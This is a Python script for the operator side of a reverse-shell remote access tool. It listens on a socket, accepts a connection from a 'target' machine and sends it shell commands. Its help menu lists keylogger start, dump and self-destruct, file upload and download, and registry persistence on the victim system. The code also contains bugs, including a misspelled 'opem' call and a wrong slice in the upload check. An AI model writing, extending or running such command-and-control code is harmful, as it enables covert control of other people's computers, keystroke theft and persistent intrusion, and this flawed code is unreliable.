import socket 
from termcolor import colored
import json
import os


def receive():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(file_name):
    file = opem(file_name, 'rb')
    target.send(file.read())


def target_communication():
    while True:
        command = input(f'Shell@{ip}: ')
        send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[7:] == 'upload':
            upload_file(command)
        elif command == 'help':
            print(colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File
            persistence *RegName* *fileName*    --> Create Persistence In Registry\n\n\n''', 'red'))
        else:
            result = receive()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(colored('[0_0] Listening...', 'green'))
sock.listen(5)

target, ip = sock.accept()
print(colored(f'[^_^] Connection successful! {ip}!!!', 'blue'))
target_communication()